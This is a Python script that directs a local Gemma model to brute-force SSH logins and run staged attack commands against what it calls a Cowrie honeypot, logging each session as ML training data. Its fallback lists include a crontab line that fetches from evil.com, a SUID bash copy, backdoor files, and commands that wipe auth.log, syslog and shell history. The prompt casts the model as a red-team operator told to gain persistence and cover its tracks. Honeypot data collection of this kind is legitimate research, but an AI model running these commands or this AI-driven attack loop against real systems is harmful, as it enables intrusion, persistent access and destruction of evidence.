import requests
import time
import random
import re
import paramiko
import csv
import os
import math
from datetime import datetime
from collections import Counter
from colorama import Fore, init

init(autoreset=True)

# ============================================
# Password Wordlist Loader
# ============================================
class PasswordWordlist:
    """Load and manage real password wordlists from SecLists repository"""
    
    WORDLISTS = {
        "10k": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt",
        "500-worst": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/500-worst-passwords.txt",
        "common": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/common-passwords.txt",
    }
    
    def __init__(self, cache_file="password_wordlist.cache"):
        self.cache_file = cache_file
        self.passwords = []
        self.load()
    
    def load(self):
        """Load wordlists from cache or download from internet"""
        if os.path.exists(self.cache_file):
            print(f"{Fore.GREEN}📁 Loading cached passwords from {self.cache_file}...")
            with open(self.cache_file, 'r', encoding='utf-8', errors='ignore') as f:
                self.passwords = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN}✅ Loaded {len(self.passwords)} passwords from cache")
            return
        
        print(f"{Fore.YELLOW}🌐 Downloading password wordlists...")
        all_passwords = []
        
        for name, url in self.WORDLISTS.items():
            try:
                print(f"  Downloading {name}...")
                response = requests.get(url, timeout=30)
                if response.status_code == 200:
                    passwords = response.text.splitlines()
                    all_passwords.extend(passwords)
                    print(f"    ✅ {name}: {len(passwords)} passwords")
                else:
                    print(f"    ⚠️ {name} failed (HTTP {response.status_code})")
            except Exception as e:
                print(f"    ⚠️ {name} error: {e}")
        
        self.passwords = list(set(all_passwords))
        print(f"{Fore.GREEN}✅ Total unique passwords: {len(self.passwords)}")
        
        with open(self.cache_file, 'w', encoding='utf-8', errors='ignore') as f:
            f.write('\n'.join(self.passwords))
        print(f"{Fore.GREEN}💾 Saved to cache: {self.cache_file}")
    
    def get_password(self, is_correct=False):
        """Select a password from the wordlist"""
        if not self.passwords:
            return "password" if is_correct else "wrongpass"
        
        if is_correct:
            candidates = self.passwords[:500]
        else:
            candidates = self.passwords
        
        return random.choice(candidates)
    
    def get_random_passwords(self, count=10):
        """Get random sample of passwords"""
        if not self.passwords:
            return ["password", "123456", "admin", "root", "toor"]
        return random.sample(self.passwords, min(count, len(self.passwords)))


# ============================================
# Attack Data Collector
# ============================================
class AttackDataCollector:
    """Collect and store attack data for ML training"""
    
    FIELDNAMES = [
        'timestamp', 'username', 'password', 'src_ip', 'password_length',
        'command', 'command_length', 'stage', 'from_ai',
        'exec_time', 'output_length', 'has_error',
        'hour', 'day_of_week', 'is_weekend',
        'time_since_last_cmd', 'failed_attempts_before',
        'cmd_entropy', 'timing_pattern', 'label', 'login_success'
    ]

    def __init__(self, output_file="attack_training_data.csv"):
        self.output_file = output_file
        self.records = []
        self.last_cmd_time = None
        self.honeypot_ip = ""

        if not os.path.exists(output_file):
            with open(output_file, 'w', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=self.FIELDNAMES)
                writer.writeheader()
            print(f"{Fore.GREEN}📁 Created new dataset: {output_file}")

    def calculate_entropy(self, commands_list):
        """Calculate Shannon entropy of command sequence"""
        if not commands_list or len(commands_list) < 2:
            return 0.0
        counts = Counter(commands_list)
        total = len(commands_list)
        entropy = 0.0
        for count in counts.values():
            p = count / total
            entropy -= p * math.log2(p)
        return round(entropy, 3)

    def analyze_timing_pattern(self, execution_times):
        """Analyze execution time variance to detect patterns"""
        if len(execution_times) < 3:
            return "unknown"
        avg_time = sum(execution_times) / len(execution_times)
        variance = sum((t - avg_time) ** 2 for t in execution_times) / len(execution_times)
        if variance < 0.1:
            return "robotic"
        elif variance < 0.5:
            return "mixed"
        else:
            return "human"

    def add_record(self, **kwargs):
        """Add a new attack record to the dataset"""
        now = datetime.now()
        time_since_last = 0.0
        if self.last_cmd_time:
            time_since_last = round((now - self.last_cmd_time).total_seconds(), 2)
        self.last_cmd_time = now

        record = {
            'timestamp': now.strftime('%Y-%m-%d %H:%M:%S'),
            'hour': now.hour,
            'day_of_week': now.weekday(),
            'is_weekend': now.weekday() >= 5,
            'time_since_last_cmd': time_since_last,
            'label': 1,
        }
        record.update(kwargs)

        with open(self.output_file, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=self.FIELDNAMES)
            writer.writerow(record)
        self.records.append(record)
        return record


# ============================================
# Main Attacker Class
# ============================================
class PrettyGemmaAttacker:
    """AI-powered SSH honeypot attacker with dynamic credential generation"""
    
    def __init__(self, honeypot_ip, port, username, password):
        self.honeypot = honeypot_ip
        self.port = port
        self.username = username
        self.password = password
        self.ollama_url = "http://localhost:11434"

        self.current_username = username
        self.current_password = password
        self.wordlist = PasswordWordlist()
        
        self.collector = AttackDataCollector()
        self.collector.honeypot_ip = honeypot_ip

        self.command_history = []
        self.output_history = []
        self.stage_history = []
        self.timestamp_history = []
        self.execution_times = []
        self.ai_commands = []
        self.login_attempts = []

        self.auth_success_rate = 0.7
        self.ai_chance = 0.98
        self.ai_timeout = 15
        self.consecutive_ai_fails = 0
        self.max_commands = 20
        self.use_dynamic_credentials = True

        self.ssh_client = None
        self.shell = None
        self.used_commands = set()
        self.context_memory = []

        self.state = {
            'is_root': False,
            'has_sudo': False,
            'has_persist': False,
            'recon_done': False,
            'system_info': {},
            'discovered_files': [],
            'network_info': {}
        }

        self.session_start = None
        self.last_cmd_timestamp = None

        self.fallback_commands = {
            "recon": [
                "pwd", "ls -la /tmp", "cat /etc/passwd", "ps aux",
                "netstat -tulpn", "df -h", "uptime", "hostname", "env",
                "free -m", "ls -la /home", "cat /etc/os-release", "w",
                "cat /proc/version", "dmesg | head -20", "lsmod",
                "find / -perm -4000 2>/dev/null | head -10",
                "find / -perm -2000 2>/dev/null | head -10",
                "cat /etc/hosts", "route -n", "ifconfig",
                "cat /etc/resolv.conf", "last", "who", "lsof | head -20"
            ],
            "creative": [
                "find / -name '*.conf' 2>/dev/null | head -5",
                "cat /etc/ssh/sshd_config 2>/dev/null | grep -v '#'",
                "ls -la /var/log/auth.log 2>/dev/null", "mount",
                "cat /etc/fstab 2>/dev/null",
                "find /var/www -type f 2>/dev/null | head -10",
                "find /home -name '.bashrc' 2>/dev/null",
                "strings /bin/ls | grep -i pass 2>/dev/null | head -5"
            ],
            "persist": [
                "mkdir -p /root/.ssh && chmod 700 /root/.ssh",
                "echo '* * * * * root /bin/echo test' >> /etc/crontab",
                "touch /root/.backdoor && chmod +x /root/.backdoor",
                "echo '*/5 * * * * root /usr/bin/wget -q -O /dev/null http://evil.com/backdoor' >> /etc/crontab",
                "echo 'source ~/.evilrc' >> /root/.bashrc",
                "cp /bin/bash /tmp/.hidden && chmod u+s /tmp/.hidden 2>/dev/null"
            ],
            "clean": [
                "history -c", "rm -rf ~/.bash_history",
                "echo '' > ~/.bash_history", "unset HISTFILE",
                "rm -rf /tmp/* 2>/dev/null",
                "echo '' > /var/log/auth.log 2>/dev/null",
                "echo '' > /var/log/syslog 2>/dev/null",
                "rm -rf ~/.ssh/known_hosts 2>/dev/null",
                "history -w /dev/null 2>/dev/null"
            ]
        }

    @property
    def mission_success(self):
        return self.state['has_persist'] and self.state['is_root']

    @property
    def mission_completion_rate(self):
        score = 0
        if self.state['is_root']: score += 50
        if self.state['has_persist']: score += 50
        return score

    @property
    def auth_success_rate_actual(self):
        if not self.login_attempts:
            return 0.0
        return sum(self.login_attempts) / len(self.login_attempts) * 100

    def generate_dynamic_username(self):
        """Generate realistic username using AI"""
        prompt = """Generate a realistic Linux username that an SSH attacker might try.
        Examples: admin, test, ubuntu, pi, oracle, postgres, deploy, backup
        Return ONLY the username, nothing else.
        Username:"""
        
        try:
            response = requests.post(
                f"{self.ollama_url}/api/generate",
                json={
                    "model": "gemma3:4b",
                    "prompt": prompt,
                    "stream": False,
                    "options": {"temperature": 0.9, "num_predict": 20}
                },
                timeout=10
            )
            username = response.json().get("response", "").strip().lower()
            username = re.sub(r'[^a-z0-9_]', '', username)
            if username and len(username) >= 3:
                return username
            return random.choice(["admin", "test", "user", "ubuntu", "pi"])
        except:
            return random.choice(["admin", "test", "user", "ubuntu", "pi"])

    def get_next_credentials(self):
        """Generate next credential pair for SSH login attempt"""
        is_success = random.random() < self.auth_success_rate
        
        if self.use_dynamic_credentials:
            if is_success:
                username = self.username
                password = self.wordlist.get_password(is_correct=True)
                status_text = f"SUCCESS (from wordlist)"
            else:
                username = self.generate_dynamic_username()
                password = self.wordlist.get_password(is_correct=False)
                status_text = f"FAILED (dynamic: {username})"
        else:
            if is_success:
                username = self.username
                password = self.password
                status_text = "SUCCESS"
            else:
                username = self.username
                wrong_variants = ["wrongpassword", "password123", "admin123", "root123", "toor", "passw0rd", "12345678"]
                password = random.choice(wrong_variants) + str(random.randint(10, 99))
                status_text = "FAILED"
        
        return username, password, is_success, status_text

    def print_banner(self):
        """Display attack banner with configuration"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.CYAN}║{Fore.WHITE}{'🧠 COWRIE ATTACKER':^78}{Fore.CYAN}║")
        print(f"{Fore.CYAN}{'='*80}")
        print(f"{Fore.GREEN}🎯 Target:     {Fore.WHITE}{self.honeypot}:{self.port}")
        print(f"{Fore.GREEN}🤖 AI Model:   {Fore.WHITE}Gemma 3:4b")
        print(f"{Fore.GREEN}📈 Auth Rate:  {Fore.WHITE}{self.auth_success_rate*100:.0f}% configured")
        print(f"{Fore.GREEN}📚 Wordlist:   {Fore.WHITE}{len(self.wordlist.passwords)} real passwords loaded")
        print(f"{Fore.GREEN}📅 Started:    {Fore.WHITE}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Fore.CYAN}{'='*80}\n")

    def print_step_header(self, step, command, stage, from_ai=False):
        """Print formatted step header with stage info"""
        stage_colors = {
            "recon": Fore.BLUE, "privesc": Fore.MAGENTA, "persist": Fore.RED,
            "clean": Fore.GREEN, "exit": Fore.YELLOW, "creative": Fore.CYAN,
            "bootstrap": Fore.WHITE
        }
        stage_icons = {
            "recon": "🔍", "privesc": "🔓", "persist": "🚪",
            "clean": "🧹", "exit": "🏁", "creative": "💡", "bootstrap": "🚀"
        }
        color = stage_colors.get(stage, Fore.WHITE)
        icon = stage_icons.get(stage, "❓")
        timestamp = datetime.now().strftime("%H:%M:%S")
        source_indicator = f"{Fore.MAGENTA}[🤖 AI]{Fore.WHITE}" if from_ai else f"{Fore.CYAN}[📋 FB]{Fore.WHITE}"

        print(f"\n{Fore.CYAN}┌{'─'*78}┐")
        print(f"{Fore.CYAN}│{Fore.WHITE} Step {step:2d} {Fore.YELLOW}{timestamp} {color}{icon} [{stage.upper():8s}] {source_indicator}{' '*45}{Fore.CYAN}│")
        print(f"{Fore.CYAN}├{'─'*78}┤")
        cmd_color = Fore.MAGENTA if stage == "creative" else Fore.YELLOW
        print(f"{Fore.CYAN}│{Fore.WHITE} ⚡ Command:  {cmd_color}{command[:65]}{' '* (65-len(command[:65]))}{Fore.CYAN}│")
        print(f"{Fore.CYAN}└{'─'*78}┘")

    def print_success(self, output, exec_time):
        """Print successful command execution"""
        preview = output.replace('\n', ' ').strip()[:70]
        if not preview:
            preview = "(no output)"
        print(f"  {Fore.GREEN}✅ SUCCESS{Fore.WHITE}  ⏱️  {exec_time:.2f}s")
        print(f"  {Fore.CYAN}📄 Output:{Fore.WHITE}  {preview}")

    def print_failure(self, error, exec_time):
        """Print failed command execution"""
        print(f"  {Fore.RED}❌ FAILED{Fore.WHITE}   ⏱️  {exec_time:.2f}s")
        print(f"  {Fore.RED}⚠️  Error:{Fore.WHITE}  {error[:70]}")

    def print_state(self):
        """Print current mission state"""
        root_color = Fore.GREEN if self.state['is_root'] else Fore.RED
        sudo_color = Fore.GREEN if self.state['has_sudo'] else Fore.RED
        persist_color = Fore.GREEN if self.state['has_persist'] else Fore.RED

        state_text = (
            f"{root_color}root={self.state['is_root']} "
            f"{sudo_color}sudo={self.state['has_sudo']} "
            f"{persist_color}persist={self.state['has_persist']}"
        )

        if len(self.ai_commands) > 0:
            ai_count = sum(1 for x in self.ai_commands if x)
            ai_pct = (ai_count / len(self.ai_commands)) * 100
            ai_color = Fore.MAGENTA if ai_pct > 90 else (Fore.GREEN if ai_pct > 70 else Fore.YELLOW)
            ai_info = f" {ai_color}[AI: {ai_pct:.0f}%]{Fore.WHITE}"
        else:
            ai_info = ""

        print(f"  {Fore.CYAN}🎯 State:{Fore.WHITE} {state_text}{ai_info}")

        if self.mission_success:
            print(f"  {Fore.GREEN}🏆 MISSION SUCCESS! Root + Persistence achieved!")
        elif self.state['is_root']:
            print(f"  {Fore.RED}👑 ROOT ACCESS DETECTED! Persistence now allowed.")
        elif self.state['has_persist']:
            print(f"  {Fore.YELLOW}🚪 PERSISTENCE WITHOUT ROOT! (Unusual)")

    def attempt_login(self, username, password):
        """Attempt SSH login with given credentials"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                hostname=self.honeypot, port=self.port,
                username=username, password=password,
                timeout=8, allow_agent=False, look_for_keys=False
            )
            return client, True
        except paramiko.AuthenticationException:
            return None, False
        except Exception as e:
            print(f"{Fore.RED}❌ Connection error: {e}")
            return None, False

    def connect_ssh(self):
        """Establish SSH connection to honeypot"""
        try:
            if self.ssh_client:
                try:
                    self.ssh_client.close()
                except:
                    pass
            
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            username, password, is_success, status_text = self.get_next_credentials()
            
            self.current_username = username
            self.current_password = password
            
            print(f"  🔐 Login: {status_text} (user: {username}, pass: {password[:15]}...)")
            
            client, connected = self.attempt_login(username, password)
            
            if is_success and connected:
                self.ssh_client = client
                self.shell = client.invoke_shell()
                time.sleep(0.5)
                _ = self.receive_output(timeout=1)
                self.login_attempts.append(True)
                self.session_start = datetime.now()
                return True
            elif not is_success and not connected:
                self.login_attempts.append(False)
                return False
            elif is_success and not connected:
                print(f"{Fore.RED}⚠️ UNEXPECTED: Correct credentials failed!")
                self.login_attempts.append(False)
                return False
            else:
                print(f"{Fore.YELLOW}⚠️ UNEXPECTED: Wrong credentials succeeded!")
                client.close()
                self.login_attempts.append(False)
                return False
                
        except paramiko.AuthenticationException:
            self.login_attempts.append(False)
            return False
        except Exception as e:
            print(f"{Fore.RED}❌ Connection failed: {e}")
            return False

    def receive_output(self, timeout=5):
        """Receive and clean shell output"""
        output = ""
        start_time = time.time()
        while time.time() - start_time < timeout:
            if self.shell and self.shell.recv_ready():
                try:
                    chunk = self.shell.recv(4096).decode('utf-8', errors='ignore')
                    output += chunk
                    start_time = time.time()
                except:
                    break
            else:
                time.sleep(0.1)
        lines = output.split('\n')
        cleaned = []
        for line in lines:
            if not re.match(r'^root@[\w\-]+:~#', line):
                cleaned.append(line)
        return '\n'.join(cleaned)

    def execute_command(self, command, max_retries=2):
        """Execute shell command on honeypot"""
        if not self.shell:
            if not self.connect_ssh():
                return "ERROR: Failed to connect", False

        dangerous_patterns = [':(){ :|:& };:', 'mkfs', 'dd if=', '> /dev/sda', 'rm -rf /']
        for pattern in dangerous_patterns:
            if pattern in command:
                print(f"  {Fore.YELLOW}⚠️ Dangerous command blocked: {command[:50]}")
                return "(blocked)", False

        retries = 0
        while retries < max_retries:
            try:
                safe_cmd = command.replace('`', '').replace('$(', '').strip()
                self.shell.send(f"{safe_cmd}\n")
                time.sleep(0.1)
                output = self.receive_output(timeout=1.5)

                if not output and len(self.command_history) > 0:
                    self.shell.send("echo PING\n")
                    time.sleep(0.5)
                    ping_output = self.receive_output(timeout=2)
                    if "PING" not in ping_output:
                        print(f"  {Fore.YELLOW}⚠️ Shell died, reconnecting...")
                        if self.connect_ssh():
                            retries += 1
                            continue
                        else:
                            return "ERROR: Shell dead, reconnect failed", False

                success = len(output.strip()) > 0 and "ERROR" not in output
                return output.strip() if output else "(no output)", success

            except Exception as e:
                print(f"  {Fore.YELLOW}⚠️ Error: {e}, retrying...")
                retries += 1
                if retries < max_retries and self.connect_ssh():
                    continue
                return f"ERROR: {e}", False

        return "ERROR: Max retries exceeded", False

    def update_state(self, output, command):
        """Update mission state based on command output"""
        out_lower = output.lower()

        if "uid=0" in out_lower or (command == "whoami" and "root" in out_lower):
            if not self.state['is_root']:
                self.state['is_root'] = True
                print(f"  {Fore.RED}👑 ROOT ACCESS DETECTED!")

        if "nopasswd" in out_lower or ("sudo" in out_lower and "all" in out_lower):
            self.state['has_sudo'] = True

        persist_patterns = [
            r'crontab', r'>>\s*/etc/crontab', r'>>\s*~/.bashrc',
            r'authorized_keys', r'\.ssh/', r'chmod\s+u\+s', r'backdoor',
            r'echo.*>.*cron', r'echo.*>>.*cron'
        ]
        is_persist = any(re.search(p, command) for p in persist_patterns)

        if is_persist:
            error_indicators = ['permission denied', 'no such file', 'command not found',
                               'cannot', 'error', 'failed', 'refused']
            has_error = any(err in out_lower for err in error_indicators)

            if not has_error and not self.state['has_persist']:
                self.state['has_persist'] = True
                print(f"  {Fore.RED}🚪 PERSISTENCE ESTABLISHED!")

        info_map = {
            "uname -a": "kernel",
            "hostname": "hostname",
            "pwd": "current_dir"
        }
        if command in info_map and output:
            self.state['system_info'][info_map[command]] = output.strip()

        self.context_memory.append({
            'command': command,
            'output_preview': output[:100],
            'timestamp': datetime.now().strftime("%H:%M:%S")
        })
        if len(self.context_memory) > 8:
            self.context_memory.pop(0)

    def determine_stage(self):
        """Determine current attack stage based on state"""
        if len(self.command_history) == 0:
            return "bootstrap"
        if not self.state['recon_done'] and not self.state['is_root']:
            return "recon"
        if self.state['is_root'] and len(self.command_history) < 6:
            return "recon"
        if self.state['is_root'] and not self.state['has_persist']:
            return "persist"
        if self.state['has_persist'] and len(self.command_history) < 16:
            return "clean"
        if len(self.command_history) > 18:
            return "exit"
        if random.random() < 0.25 and len(self.command_history) > 3:
            return "creative"
        return "recon"

    def generate_ai_prompt(self, stage):
        """Generate AI prompt for command generation"""
        recent = self.command_history[-10:] if len(self.command_history) >= 10 else self.command_history

        context_lines = []
        if self.context_memory:
            context_lines.append("=== RECENT ACTIVITY ===")
            for mem in self.context_memory[-4:]:
                status = "✓" if len(mem['output_preview']) > 5 else "✗"
                context_lines.append(f"[{status}] {mem['command']} -> {mem['output_preview'][:55]}")

        if self.state['system_info']:
            context_lines.append("\n=== SYSTEM ===")
            for k, v in list(self.state['system_info'].items())[:4]:
                context_lines.append(f"{k}: {v}")

        context = '\n'.join(context_lines) if context_lines else "Starting fresh session."
        used_list = ', '.join(recent) if recent else "none"
        persist_text = "YES" if self.state['is_root'] else "NO - do NOT use persistence commands"

        stage_guidance = {
            "bootstrap": "Gather basic system info. Suggest: whoami, id, uname -a, hostname, pwd",
            "recon": "Deep reconnaissance. Explore: files, processes, network, users, permissions, SUID binaries.",
            "persist": "Establish persistence. Use: crontab edits, SSH authorized_keys, hidden files, SUID shells.",
            "clean": "Cover tracks. Clear: logs, shell history, temp files, auth records.",
            "creative": "Be clever and unexpected. Try: alternate data streams, steganography, unexpected paths.",
        }
        guidance = stage_guidance.get(stage, "Execute a useful command.")

        prompt = f"""You are a red team operator with shell access to a Linux server.

{context}

PHASE: {stage.upper()}
OBJECTIVE: {guidance}
USER: root | ROOT: {'YES' if self.state['is_root'] else 'NO'} | PERSIST: {persist_text}

FORBIDDEN (already used - NEVER repeat):
{used_list}

RULES:
1. Output ONLY the raw shell command - no quotes, no labels, no explanations
2. MUST differ from all forbidden commands
3. Use only standard POSIX tools (cat, ls, ps, find, grep, echo, etc.)
4. Avoid: less, vim, nano, ip, systemctl, apt, yum
5. Ensure quotes and brackets are balanced

Command:"""
        return prompt

    def clean_ai_output(self, raw_output):
        """Clean and validate AI-generated command"""
        if not raw_output:
            return None

        lines = raw_output.strip().split('\n')

        for line in lines:
            line = line.strip()
            if not line:
                continue

            line = re.sub(r'^```\s*\w*', '', line)
            line = re.sub(r'```$', '', line)
            line = re.sub(r'^[`\'"*\-\$#>\d\.\s]+', '', line)
            line = re.sub(r'[`\'"]+$', '', line)
            line = re.sub(r'^(CMD|COMMAND|cmd|command)\s*[:\-]?\s*', '', line, flags=re.IGNORECASE)
            line = re.sub(r'^(The command is|Here is|Output is|Run this)\s*[:\-]?\s*', '', line, flags=re.IGNORECASE)
            line = line.strip()

            skip_patterns = [
                r'^you\s', r'^there\s', r'^this\s', r'^here\s', r'^the\s', r'^a\s', r'^an\s',
                r'^note', r'^remember', r'^important', r'^rule', r'^example', r'^return',
                r'^only', r'^never', r'^must', r'^don\'t', r'^do\snot', r'^please',
                r'^to\s', r'^if\s', r'^since\s', r'^because\s',
            ]
            if any(re.match(p, line, re.IGNORECASE) for p in skip_patterns):
                continue

            if len(line) < 2 or len(line) > 200:
                continue

            if not re.match(r'^[a-zA-Z0-9/\.\-_]', line):
                continue

            if line.count('"') % 2 != 0 or line.count("'") % 2 != 0:
                if line.endswith('"') and line[:-1].count('"') % 2 == 0:
                    line = line[:-1]
                elif line.endswith("'") and line[:-1].count("'") % 2 == 0:
                    line = line[:-1]
                else:
                    continue

            if line.count('(') != line.count(')'):
                continue

            return line

        return None

    def get_ai_command(self, stage):
        """Generate command using AI model"""
        max_attempts = 5
        duplicates_in_row = 0

        for attempt in range(max_attempts):
            prompt = self.generate_ai_prompt(stage)

            try:
                response = requests.post(
                    f"{self.ollama_url}/api/generate",
                    headers={"Connection": "keep-alive"},
                    json={
                        "model": "gemma3:4b",
                        "prompt": prompt,
                        "stream": False,
                        "options": {
                            "temperature": 0.95,
                            "num_predict": 30,
                            "top_k": 50,
                            "top_p": 0.92,
                            "repeat_penalty": 1.3,
                            "seed": random.randint(1, 999999)
                        }
                    },
                    timeout=self.ai_timeout
                )

                generated = response.json()["response"]
                cleaned = self.clean_ai_output(generated)

                if not cleaned:
                    continue

                if cleaned in self.used_commands:
                    duplicates_in_row += 1
                    if duplicates_in_row >= 3:
                        print(f"  {Fore.YELLOW}⚠️ AI stuck on duplicates, switching to fallback")
                        return None
                    if attempt < max_attempts - 1:
                        print(f"  {Fore.YELLOW}⚠️ AI duplicate '{cleaned[:40]}...' ({duplicates_in_row}/3)")
                        time.sleep(0.2)
                    continue

                blacklisted = ['fping', 'lsblk', 'shred', 'socat', 'nmap', 'hydra', 'apt', 'yum', 'pip', 'npm', 'docker']
                if any(b in cleaned.lower() for b in blacklisted):
                    continue

                self.used_commands.add(cleaned)
                self.consecutive_ai_fails = 0
                return cleaned

            except Exception as e:
                continue

        self.consecutive_ai_fails += 1
        return None

    def get_fallback_command(self, stage):
        """Get fallback command from predefined list"""
        pool = self.fallback_commands.get(stage, self.fallback_commands["recon"])
        available = [c for c in pool if c not in self.used_commands]
        if not available:
            self.used_commands.clear()
            available = pool
        cmd = random.choice(available)
        self.used_commands.add(cmd)
        return cmd

    def get_next_command(self, last_output, stage):
        """Get next command either from AI or fallback"""
        stage = self.determine_stage()

        if stage == "exit":
            return "exit", False

        effective_ai_chance = self.ai_chance
        if self.consecutive_ai_fails >= 2:
            effective_ai_chance = 0.7
            print(f"  {Fore.YELLOW}⚠️ Reducing AI chance due to repeated failures")

        if random.random() < effective_ai_chance:
            ai_cmd = self.get_ai_command(stage)
            if ai_cmd:
                return ai_cmd, True

        fallback = self.get_fallback_command(stage)
        return fallback, False

    def realistic_delay(self, stage):
        """Generate realistic delay between commands"""
        delays = {
            "bootstrap": (0.5, 1.5),
            "recon": (0.3, 1.0),
            "persist": (0.5, 2.0),
            "clean": (0.2, 0.5),
            "creative": (0.5, 1.5),
        }
        min_d, max_d = delays.get(stage, (1, 2))
        return random.uniform(min_d, max_d)

    def attack(self, max_commands=20):
        """Main attack loop"""
        self.max_commands = max_commands
        self.print_banner()

        if not self.connect_ssh():
            print(f"{Fore.RED}❌ Failed to connect to honeypot!")
            return

        for step in range(max_commands):
            stage = self.determine_stage()

            if stage == "exit":
                print(f"\n{Fore.GREEN}🎯 Mission accomplished!")
                break

            last_output = self.output_history[-1] if self.output_history else ""
            command, from_ai = self.get_next_command(last_output, stage)

            if command == "exit":
                break

            self.print_step_header(step+1, command, stage, from_ai)

            cmd_start = time.time()
            output, success = self.execute_command(command)
            cmd_end = time.time()
            exec_time = round(cmd_end - cmd_start, 2)

            self.execution_times.append(exec_time)
            self.ai_commands.append(from_ai)

            if success:
                self.print_success(output, exec_time)
                self.update_state(output, command)
            else:
                self.print_failure(output, exec_time)

            self.print_state()

            failed_attempts = len([x for x in self.login_attempts if not x])

            self.collector.add_record(
                username=self.current_username,
                password=self.current_password,
                password_length=len(self.current_password),
                command=command,
                command_length=len(command),
                stage=stage,
                from_ai=from_ai,
                exec_time=exec_time,
                output_length=len(output) if output else 0,
                has_error=not success,
                failed_attempts_before=failed_attempts,
                cmd_entropy=self.collector.calculate_entropy(self.command_history),
                timing_pattern=self.collector.analyze_timing_pattern(self.execution_times),
                src_ip=self.honeypot
            )

            self.command_history.append(command)
            self.output_history.append(output[:300])
            self.stage_history.append(stage)
            self.timestamp_history.append(datetime.now().strftime("%H:%M:%S"))

            delay = self.realistic_delay(stage)
            time.sleep(delay)

        if self.ssh_client:
            self.ssh_client.close()

        self.print_final_report()

    def print_final_report(self):
        """Display final attack summary"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.CYAN}║{Fore.WHITE}{'📊 AI ATTACK REPORT v16.0 - HYBRID CREDENTIALS':^78}{Fore.CYAN}║")
        print(f"{Fore.CYAN}{'='*80}")

        total = len(self.command_history)
        unique = len(set(self.command_history))
        uniqueness = (unique/total*100) if total > 0 else 0
        ai_count = sum(1 for x in self.ai_commands if x)
        ai_pct = (ai_count/total*100) if total > 0 else 0

        print(f"\n{Fore.GREEN}📈 AUTHENTICATION STATISTICS")
        print(f"  {Fore.CYAN}├─{Fore.WHITE} Attempts:         {Fore.YELLOW}{len(self.login_attempts)}")
        print(f"  {Fore.CYAN}├─{Fore.WHITE} Success Rate:     {Fore.GREEN}{self.auth_success_rate_actual:.1f}%")
        print(f"  {Fore.CYAN}└─{Fore.WHITE} Configured Rate:  {Fore.YELLOW}{self.auth_success_rate*100:.0f}%")

        print(f"\n{Fore.GREEN}📈 MISSION STATISTICS")
        print(f"  {Fore.CYAN}├─{Fore.WHITE} Mission Complete: {Fore.GREEN if self.mission_success else Fore.RED}{self.mission_success}")
        print(f"  {Fore.CYAN}├─{Fore.WHITE} Completion Rate: {Fore.YELLOW}{self.mission_completion_rate}%")
        print(f"  {Fore.CYAN}├─{Fore.WHITE} Root Access:      {Fore.GREEN if self.state['is_root'] else Fore.RED}{self.state['is_root']}")
        print(f"  {Fore.CYAN}└─{Fore.WHITE} Persistence:      {Fore.GREEN if self.state['has_persist'] else Fore.RED}{self.state['has_persist']}")

        print(f"\n{Fore.GREEN}📈 COMMAND STATISTICS")
        print(f"  {Fore.CYAN}├─{Fore.WHITE} Total Commands:   {Fore.YELLOW}{total}")
        print(f"  {Fore.CYAN}├─{Fore.WHITE} Unique Commands:  {Fore.YELLOW}{unique}")
        uni_color = Fore.GREEN if uniqueness > 80 else Fore.YELLOW
        print(f"  {Fore.CYAN}├─{Fore.WHITE} Uniqueness Rate:  {uni_color}{uniqueness:.1f}%")
        ai_color = Fore.MAGENTA if ai_pct > 90 else (Fore.GREEN if ai_pct > 70 else Fore.YELLOW)
        print(f"  {Fore.CYAN}├─{Fore.WHITE} AI Contribution:  {ai_color}{ai_pct:.1f}% ({ai_count}/{total})")

        entropy = self.collector.calculate_entropy(self.command_history)
        ent_color = Fore.GREEN if entropy > 3 else Fore.YELLOW
        print(f"  {Fore.CYAN}├─{Fore.WHITE} Command Entropy:  {ent_color}{entropy:.2f}")

        timing = self.collector.analyze_timing_pattern(self.execution_times)
        tim_color = Fore.GREEN if timing == "human" else (Fore.YELLOW if timing == "mixed" else Fore.RED)
        print(f"  {Fore.CYAN}└─{Fore.WHITE} Timing Pattern:   {tim_color}{timing}")

        stages_used = {}
        for stage in self.stage_history:
            stages_used[stage] = stages_used.get(stage, 0) + 1
        print(f"\n{Fore.GREEN}📈 STAGE DISTRIBUTION")
        for stage, count in stages_used.items():
            icon = {"recon":"🔍","persist":"🚪","clean":"🧹","creative":"💡","bootstrap":"🚀"}.get(stage,"❓")
            print(f"  {Fore.CYAN}├─ {icon} {stage}: {count}")

        mitre_list = []
        print(f"\n{Fore.GREEN}🎯 MITRE ATT&CK TECHNIQUES")
        for tech in mitre_list[:10]:
            print(f"  {Fore.CYAN}├─ {Fore.YELLOW}{tech}")

        print(f"\n{Fore.GREEN}💾 Training data saved to: {Fore.WHITE}{self.collector.output_file}")
        print(f"{Fore.CYAN}{'='*80}\n")


if __name__ == "__main__":
    attacker = PrettyGemmaAttacker(
        honeypot_ip="10.10.10.11",
        port=2222,
        username="root",
        password="password"
    )
    attacker.attack(max_commands=20)